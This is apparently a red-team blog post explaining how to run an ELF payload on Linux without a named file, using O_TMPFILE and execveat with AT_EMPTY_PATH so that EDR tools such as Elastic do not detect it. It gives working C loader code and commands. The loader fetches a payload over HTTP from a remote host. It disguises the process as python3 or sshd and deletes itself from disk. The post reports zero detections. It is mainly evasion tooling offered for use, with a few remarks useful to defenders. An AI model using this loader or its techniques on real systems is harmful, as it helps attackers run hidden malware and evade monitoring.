---
title: "Fileless ELF Execution via O_TMPFILE"
date: 2026-09-06T00:00:00-04:00
description: "O_TMPFILE creates anonymous inodes on real filesystems with no directory entry. Combine it with execveat(AT_EMPTY_PATH) and you get fileless ELF execution that looks nothing like memfd_create in telemetry."
categories: [Evasion]
tags: [Fileless, EDR, Elastic, Linux, Red Team, Kernel]
author: 0xMatheuZ
draft: false
ShowToc: true
TocOpen: true
UseHugoToc: true
cover:
  image: "https://i.imgur.com/n4kkDlE.jpeg"
---

![imgur](https://i.imgur.com/n4kkDlE.jpeg)

Hello guys! So today I want to show a way to execute an ELF payload that never touches disk as a named file. No `memfd_create`, no `/memfd:` prefix anywhere in telemetry. The trick is `O_TMPFILE` combined with `execveat(AT_EMPTY_PATH)`, and it works on any kernel since 3.19.

The issue with `memfd_create` is that it leaves a very specific fingerprint: `process.executable` shows `/memfd:name (deleted)`, the backing device is `00:01` (the kernel's internal anonymous tmpfs), and the syscall number is 319. Elastic, Falco, and basically every modern EDR have signatures for exactly that combination. `O_TMPFILE` takes a completely different path through the kernel and produces none of those artifacts.

`O_TMPFILE` is an `open()` flag introduced in Linux 3.11. Instead of passing a filename, you pass a directory:

```c
int fd = open("/tmp", O_TMPFILE | O_RDWR | O_CLOEXEC, 0700);
```

That's still plain `open()`, syscall 2. The kernel allocates an inode directly on that filesystem's superblock and returns a file descriptor. No directory entry is ever created. The file never appears in `ls` or `find`, and no creation event fires.

The reason comes down to the inode/dentry split. An inode is the kernel's internal object for a file: data, permissions, timestamps, block addresses. A dentry is the name-to-inode mapping that makes `/tmp/payload` resolvable. `O_TMPFILE` creates the inode but the resulting dentry is kept unhashed, never inserted into the directory tree. `inotify` and `fanotify` hook creation events through dentry operations, so without a visible dentry neither fires a creation event. No `IN_CREATE`, no `FAN_CREATE`.

The inode lands on the real `/tmp` filesystem with a real device number. This is not a memory trick. `linkat(2)` with `AT_EMPTY_PATH` can materialize the anonymous inode into a named path at any point while you hold the fd. But we never do that.

Once we have the fd, writing the payload is just:

```c
write(fd, elf_bytes, elf_size);
```

Now the execution part. The kernel refuses to exec a fd that is open for writing; it returns `ETXTBSY`. The fix is to reopen the inode read-only through `/proc/self/fd/` and close the original:

```c
char fdpath[64];
snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
int ro_fd = open(fdpath, O_RDONLY | O_CLOEXEC);
close(fd);
```

Then execute with `execveat` and the `AT_EMPTY_PATH` flag:

```c
execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
```

When `execveat` gets `AT_EMPTY_PATH` with an empty path string it calls `do_execveat_common()` skipping path resolution entirely. The VFS never walks a directory tree, never constructs a pathname, never touches a visible dentry. It takes the backing file from the fd and loads the ELF directly.

What the kernel records for the running process:

```
process.executable: /tmp/#220 (deleted)
```

The `#` prefix and inode number are how the kernel represents a nameless inode in `/proc`. The `(deleted)` suffix is there for the same reason any unlinked-but-running binary gets it: it's the same suffix a totally legitimate process produces if its binary gets unlinked while running. Nothing specific to fileless execution.

I built this into [Dntry](https://github.com/MatheuZSecurity/Dntry) with three input modes: local file, HTTP fetch, and stdin pipe. The execution path:

```c
static void exec_anon(int anon_fd, char *const argv[], char *const envp[],
                      const char *spoof_name)
{
    char fdpath[64];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", anon_fd);
    int ro_fd = sc_open(fdpath, O_RDONLY | O_CLOEXEC, 0);
    sc_close(anon_fd);

    if (spoof_name)
        prctl(PR_SET_NAME, spoof_name, 0, 0, 0);

    char self_path[PATH_MAX] = {0};
    ssize_t n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (n > 0) sc_unlink(self_path);

    sc_execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
}
```

`prctl(PR_SET_NAME)` renames the thread before `execveat` replaces the process image. `readlink("/proc/self/exe")` gives back the real filesystem path the binary was loaded from, and that's what gets unlinked before the payload takes over. The candidate directories skip shared memory paths on purpose:

```c
static const char *anon_dirs[] = { "/tmp", "/var/tmp", "/run", NULL };
```

You call it like this:

```bash
cat payload.elf | ./dntry stdin python3
./dntry http http://192.168.1.10:8080/payload python3
./dntry file ./payload python3
```

The spoof name becomes `argv[0]` of the exec'd process and what shows up as `process.name` in telemetry:

```
process.name:       python3
process.executable: /tmp/#220 (deleted)
```

`prctl(PR_SET_NAME)` before exec only covers the window between the call and exec itself. After `execveat` replaces the process image, the kernel sets comm from the inode name, `#1835068` not `sshd`. `argv[0]` spoofing still works since that passes through exec args, so `process.name` is fine. For `comm` to also match, the payload itself needs to call `prctl(PR_SET_NAME)` at startup.

Running the loader under strace shows the full chain:

```bash
strace -e trace=open,read,write,execveat,prctl,unlink ./dntry http http://192.168.1.10:8080/payload sshd
```

- `open("/tmp", O_RDWR|O_CLOEXEC|O_TMPFILE, 0700)` - anonymous inode, syscall 2
- `read` / `write` loop - payload written to anon fd
- `open("/proc/self/fd/3", O_RDONLY|O_CLOEXEC)` - reopen to drop the write flag
- `prctl(PR_SET_NAME, "sshd")` - thread rename before exec
- `unlink("/home/user/dntry")` - loader gone from disk (absolute path from readlink)
- `execveat(4, "", ["sshd"], ..., AT_EMPTY_PATH)` - direct fd exec, no path

![strace output part 1](/img/fileless-strace1.png)
![strace output part 2](/img/fileless-strace2.png)

The payload runs cleanly:

![fileless payload running](/img/fileless-terminal.png)

Zero detections in Elastic Security:

![Elastic Security, 0 fileless detections](/img/fileless-elastic.png)

Fileless detection is built around specific `memfd_create` artifacts: the `memfd:` prefix in `process.executable`, device `00:01`, syscall 319. `O_TMPFILE` produces none of them. It goes through the normal `open()` path on a real mounted filesystem, `execveat(AT_EMPTY_PATH)` hands the kernel an fd directly, and no path string is ever constructed anywhere in the chain.

The `(deleted)` suffix appears on any process whose binary was unlinked while running, so that's not specific to this. The `#N` format in the path is unusual since no legitimate process has an executable at `/tmp/#220`, but that's not what the current memfd signatures key on. Those are written for the `/memfd:` prefix and device `00:01`, and neither is present here. `O_TMPFILE` is one of those flags everybody walks past on the way to `/dev/shm`, which is exactly what makes it useful.

---

*Source: [github.com/MatheuZSecurity/Dntry](https://github.com/MatheuZSecurity/Dntry)*
